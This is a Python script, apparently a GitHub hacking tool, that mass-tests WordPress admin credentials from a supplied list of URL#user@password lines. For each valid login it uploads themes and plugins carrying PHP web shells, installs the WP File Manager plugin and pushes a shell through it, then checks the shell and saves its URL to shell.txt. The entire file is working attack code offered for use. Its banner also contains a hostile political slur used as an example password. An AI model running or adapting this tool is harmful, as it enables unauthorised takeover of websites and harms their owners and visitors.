"""
Remake version of https://github.com/fooster1337/wp-login-checker
Add Features :
+ Auto Upload Themes
+ Auto Upload Plugin
+ Auto Install WP-FILE-MANAGER Plugin
+ Auto Upload Shell From Wp File Manager
"""

# import module
import requests
import os
import configparser
import sys
import re
import random
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from colorama import Fore, init
init(autoreset=True)
requests.urllib3.disable_warnings()

VERSION = 1.1
# color code
red = Fore.RED
yellow = Fore.YELLOW
reset = Fore.RESET
green = Fore.GREEN

def failed(url: str, msg: str):
    print(f"[{yellow}#{reset}] {url} --> [{red}{msg}{reset}]")

def vuln(url: str, msg: str):
    print(f"[{yellow}#{reset}] {url} --> [{green}{msg}{reset}]")

def random_name():
    let = "abcdefghijklmnopqrstuvwxyz1234567890"
    #theme_name = "themes.zip".split('.')[0]
    random_theme_name = ''.join(random.choice(let) for _ in range(8))
    return random_theme_name

def read_content_file(file_name: str):
    try:
        read = open(file_name, 'r', encoding='utf8').read()
        return read
    except:
        sys.exit(f"{red}ERROR:{reset} Unable to read {file_name}")
class Login:
    def __init__(self, url, username: str = "", password: str = "", themes_zip: str = "Files/themes.zip", plugins_zip:str = "Files/plugin.zip") -> None:
        self.sessions = requests.Session()
        self.url = url
        self.username = username
        self.password = password
        self.themes_zip = themes_zip
        self.plugins_zip = plugins_zip
        self.cookies = {}
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Upgrade-Insecure-Requests": "1"
        }
        self.random_name = random_name()
        self.url_user_pwd = self.url+"/wp-login.php"+"#"+self.username+"@"+self.password

    def save_into_file(self, filename, content: str):
        with open(filename, "a+", encoding="utf8") as k:
            k.write(content+"\n")
        k.close()

    def check_files(self):
        # double check files
        if not os.path.exists(self.themes_zip) or not os.path.exists(self.plugins_zip):
            return False
        return True
    
    def get_nonce(self, type):
        if type == "plugin":
            path = "/wp-admin/plugin-install.php"
        elif type == "themes":
            path = "/wp-admin/theme-install.php?browse=popular"
        elif type == "upload":
            path = "/wp-admin/admin.php?page=wp_file_manager"
        else:
            path = "/wp-admin/plugin-install.php?s=file%2520manager&tab=search&type=term"
        try:
            getText = self.sessions.get(self.url+path, headers=self.headers, verify=False, timeout=10).text
            if type == "plugin" or type == "themes":

                extrack_nonce = re.search('id="_wpnonce" name="_wpnonce" value="(.*?)"', getText)
            elif type == "upload":
                getText = getText.replace('\/', '/')
                extrack_nonce = re.search('var fmfparams = {{"ajaxurl":"{}/wp-admin/admin-ajax.php","nonce":"(.*?)"'.format(self.url), getText)
            else:
                if "wp-file-manager/images/wp_file_manager.svg" in getText:
                    vuln(self.url_user_pwd, "Wp_File_Manager_Installed")
                    self.save_into_file("wpfilemanager.txt", self.url_user_pwd)
                    self.upload_shell()
                    return "found"
                extrack_nonce = re.search('var _wpUpdatesSettings = {"ajax_nonce":"(.*?)"};', getText)
            if extrack_nonce:
                nonce = extrack_nonce.group(1)
                return nonce
            else:
                failed(self.url, "Failed_get_nonce")
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except:
            failed(self.url, "Error_get_nonce")

    def get_cookies(self):
        try:
            getcookies = self.sessions.get(self.url, headers=self.headers, verify=False, timeout=10)
            self.cookies = dict(getcookies.cookies)
            return True
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except Exception as e:
            failed(self.url, "Error_get_cookies")

    def check_valid_login(self):
        
        url_dash = self.url.replace('wp-login.php', 'wp-admin')
        payload = {'log': f'{self.username}', 'pwd': f'{self.password}', 'wp-submit': 'Log+In', 'redirect_to': f'{url_dash}/', 'testcookie': '1'}
        t = 0
        while True:
            try:
                req = self.sessions.post(self.url, data=payload, headers=self.headers, verify=False, timeout=10, cookies=self.cookies)
                if 'dashboard' in req.text or '/wp-admin/admin-ajax.php' in req.text or "adminpage" in req.text or "/wp-admin/" in req.url:
                    vuln(self.url+"#"+self.username+"@"+self.password, "Valid_Login")
                    return True
                # attempt 2
                else:
                    
                    failed(self.url+"#"+self.username+"@"+self.password, "Not_Valid_{}".format(t+1))
                    payload['redirect_to'] = url_dash
                    #print(payload)
                    if t >= 1:
                        break
                    t += 1

            except requests.exceptions.Timeout:
                failed(self.url, "Timeout"); return
            except Exception as e: 
                failed(self.url+"#"+self.username+"@"+self.password, "Error_when_try_login"); return

    # upload shell from wpfilemanager
    def upload_shell(self):
        shell_name = self.random_name + '.php'
        nonce = self.get_nonce('upload')
        if nonce:
            data = {
                'reqid': '18efa290e4235f',
                'cmd': 'upload',
                'target': 'l1_Lw',
                'action': 'mk_file_folder_manager',
                '_wpnonce': nonce,
                'networkhref': '',
                'mtime[]': int(time.time())
            }
            files = {
                'upload[]': (shell_name, SHELL, 'application/x-php')
            }
            
            try:
            # check files 
                req = self.sessions.get(self.url+f'/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce={nonce}&networkhref=&cmd=ls&target=l1_Lw&intersect[]={shell_name}&reqid=18efa290e4235f', headers=self.headers).json()
                if req['list']:
                    data[f"hashes[{list(req['list'].keys())[0]}]"] = shell_name
                upload = self.sessions.post(self.url+'/wp-admin/admin-ajax.php', headers=self.headers, timeout=15, verify=False, data=data, files=files)
                upload_json = upload.json()
                if upload.status_code == 200 and upload_json['added']:
                    shell_path = ''
                    for text in upload_json['added']: 
                        shell_path = text['url']
                    if shell_path:
                        check_shell = requests.get(shell_path, headers=self.headers, timeout=10, verify=False).text
                        if "GrazzMean" in check_shell or "shell bypass 403" in check_shell:
                            vuln(self.url_user_pwd, 'Upload_Shell')
                            self.save_into_file('shell.txt', shell_path)
                    else:
                        failed(self.url_user_pwd, 'Upload_Shell')
                else:
                    failed(self.url_user_pwd, 'Upload_Shell_Failed')
                
            except:
                failed(self.url_user_pwd, 'Upload_Shell_Error')

    def install_wpfilemanager(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "X-Requested-With": "XMLHttpRequest"
        }

        data = {
            "slug": "wp-file-manager",
            "action": "install-plugin",
            "_ajax_nonce": "",
            "_fs_nonce": "",
            "username": "",
            "password": "",
            "connection_type": "",
            "public_key": "",
            "private_key": ""
        }

        try:
            getNonce = self.get_nonce("wpfilemanager")
            if getNonce != "found" and getNonce:
                data['_ajax_nonce'] = getNonce
                installPlugin = self.sessions.post(self.url+"/wp-admin/admin-ajax.php", headers=headers, timeout=30, verify=False, data=data, cookies=self.cookies)
                if installPlugin.status_code == 200:
                    vuln(self.url_user_pwd, "Install_WpFileManager")
                    extract_activateurl = installPlugin.json()['data']['activateUrl']
                    activatePlugin = self.sessions.get(extract_activateurl, headers=self.headers, timeout=10)
                    if activatePlugin.status_code == 200 or "wp-file-manager/images/wp_file_manager.svg" in activatePlugin.text:     
                        vuln(self.url_user_pwd, "Activate_WpFileManager")
                        self.save_into_file("wpfilemanager.txt", self.url_user_pwd)
                        return True
                    else:
                        failed(self.url_user_pwd, "Activate_WpFileManager")
                else:
                    failed(self.url_user_pwd, "WpFileManager_Not_Installed")    
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except Exception as e:
            print(e)
            failed(self.url_user_pwd, "WpFileManager_Error")     

    def upload_themes(self):
        nonce = self.get_nonce("themes")
        if nonce:
            data = {'_wpnonce': nonce, '_wp_http_referer': '/wp-admin/theme-install.php', 'install-theme-submit': 'Installer'}
            files_up = {'themezip': ('{}.zip'.format(self.random_name), open(self.themes_zip, 'rb'), 'multipart/form-data')}
            try:
                upThemes = self.sessions.post(self.url+"/wp-admin/update.php?action=upload-theme", headers=self.headers, cookies=self.cookies, files=files_up, data=data, verify=False, timeout=20)
                if upThemes.status_code == 200:
                    vuln(self.url_user_pwd, "Upload_Themes")
                    self.save_into_file("success_upload_themes.txt", self.url_user_pwd)
                    url_shell = ['/wp-content/themes/{}/fooster1337.php', '/wp-content/themes/{}/uploader.php']
                    found = False
                    for i in url_shell:
                        i = i.format(self.random_name)
                        try:
                            req = requests.get(self.url+i, headers=self.headers).text
                        except:
                            failed(self.url_user_pwd, "Error_check_shell")
                            break
                        if "GrazzMean-Uploader" in req or "GrazzMean-Shell" in req:
                            vuln(self.url+i, "Shell_uploaded")
                            self.save_into_file("shell.txt", self.url+i)
                            found = True
                    if not found:
                        failed(self.url_user_pwd, "themes_Shell_Not_Uploaded")
                else:
                    failed(self.url_user_pwd, "themes_Failed")
            except requests.exceptions.Timeout:
                failed(self.url, "Timeout")
            except Exception as e:
                print(e)
                failed(self.url_user_pwd, "Error_upload_themes")

    def upload_plugins(self):
        nonce = self.get_nonce("plugin")
        if nonce:
            data = {'_wpnonce': nonce, '_wp_http_referer': '/wp-admin/plugin-install.php', 'install-plugin-submit': 'Install Now'}
            files_up = {'pluginzip': ('{}.zip'.format(self.random_name), open(self.plugins_zip, 'rb'), 'multipart/form-data')}
            try:
                upPlugin = self.sessions.post(self.url+"/wp-admin/update.php?action=upload-plugin", headers=self.headers, cookies=self.cookies, files=files_up, data=data, verify=False, timeout=20)
                if upPlugin.status_code == 200:
                    vuln(self.url_user_pwd, "Upload_Plugins")
                    self.save_into_file("success_upload_plugin.txt", self.url_user_pwd)
                    url_shell = ['/wp-content/plugins/{}/fooster1337.php', '/wp-content/plugins/{}/uploader.php']
                    found = False
                    for i in url_shell:
                        i = i.format(self.random_name)
                        try:
                            req = requests.get(self.url+i, headers=self.headers).text
                        except Exception as e:
                            failed(self.url_user_pwd, "Error_check_shell")
                            break
                        if "GrazzMean-Uploader" in req or "GrazzMean-Shell" in req:
                            vuln(self.url+i, "Shell_uploaded")
                            self.save_into_file("shell.txt", self.url+i)
                            found = True
                    if not found:
                        failed(self.url_user_pwd, "Plugins_Shell_Not_Uploaded")
                else:
                    failed(self.url_user_pwd, "Plugins_Failed")
            except requests.exceptions.Timeout:
                failed(self.url, "Timeout")
            except:
                failed(self.url_user_pwd, "Error_upload_plugins")


    def start(self):
        if self.check_files() and self.get_cookies():
            if self.check_valid_login():
                self.url = self.url.replace("/wp-login.php", "")
                #check_wpfilemanager = self.get_nonce("wpfilemanager")
                if not self.upload_themes():
                    self.upload_plugins()
                if self.install_wpfilemanager():
                    self.upload_shell()

def parse_domain(url):
    do = urlparse(url).scheme + '://' + urlparse(url).netloc + urlparse(url).path.replace('//', '/') + ' ' + urlparse(url).fragment
    sp = do.split()
    #url, user, pwd = sp[0], sp[1].split('@')[0], sp[1].split('@')[1]
    if sp[1].count('@') == 2:
        # print(sp[1].split('@')[1]+'@'+[2])
        # pwd = sp[1].split('@')
        # print(pwd[1]+'@'+pwd[2])
        url, user, pwd = sp[0], sp[1].split('@')[0], sp[1].split('@')[1]+'@'+sp[1].split('@')[2]
    else:
        url, user, pwd = sp[0], sp[1].split('@')[0], sp[1].split('@')[1]
    
    return url, user, pwd

def start(target):
    url, user, pwd = parse_domain(target)
    if not url and not user and not pwd:
        failed(target, "Failed_Parsing")
    else:
        if themes_zip and plugins_zip:
            Login(url, username=user, password=pwd, themes_zip=themes_zip, plugins_zip=plugins_zip).start()
        else:
            Login(url, username=user, password=pwd).start()

def get_config():
    global SHELL
    config = configparser.ConfigParser()
    try:
        if not os.path.exists("config.ini"):
            return False
        config.read("config.ini")
        shell = config['shell']['shell']
        if os.name == "nt":
            themes_zip = os.getcwd() + "\\" + config['path_windows']['themes']
            plugins_zip = os.getcwd() + "\\" + config['path_windows']['plugin']
            shell = os.getcwd() + "\\" + shell.replace('/', '\\')
        else:
            themes_zip = config['path_linux']['themes']
            plugins_zip = config['path_linux']['plugin']
        SHELL = read_content_file(shell)
        if os.path.exists(themes_zip) and os.path.exists(plugins_zip):
            return themes_zip, plugins_zip
        print(f"\n{red}ERROR: config.ini : Cannot read the value. / Files not found."); sys.exit(0)
    except Exception as e:
        print(f"\n{red}ERROR: {e}")

def main():
    global themes_zip, plugins_zip
    banner = f"""
 __          _______              _    _ _______ ____  
 \ \        / /  __ \        /\  | |  | |__   __/ __ \ 
  \ \  /\  / /| |__) |_____ /  \ | |  | |  | | | |  | |
   \ \/  \/ / |  ___/______/ /\ \| |  | |  | | | |  | |
    \  /\  /  | |         / ____ \ |__| |  | | | |__| |
     \/  \/   |_|        /_/    \_\____/   |_|  \____/  Version : {yellow}{VERSION}{reset}

            {red}[{reset} https://github.com/{Fore.BLUE}fooster1337{reset} {red}]{reset}

--> [{green}Desc{reset}] This tools use for upload plugins,themes,install wp-file-manager
--> [{yellow}Warn{reset}] Use format : https://pelerkuda.il/wp-login.php#admin@fuckisrael
"""
    print(banner)
    if get_config():
        themes_zip, plugins_zip = get_config()
    try:
        read = list(dict.fromkeys(open(input("[Input you list] --> "), "r", encoding="utf8").read().splitlines()))
        th = int(input("[Thread] -> ")) or 10
        with ThreadPoolExecutor(max_workers=th) as j:
            j.map(start, read)
    except FileNotFoundError:
        print(f"\n{red}ERROR: {reset}File not found.")
    except Exception as e:
        print(f"\n{red}ERROR: {e}")

if __name__ == "__main__":
    os.system("cls") if os.name == "nt" else os.system("clear")
    main()
    
    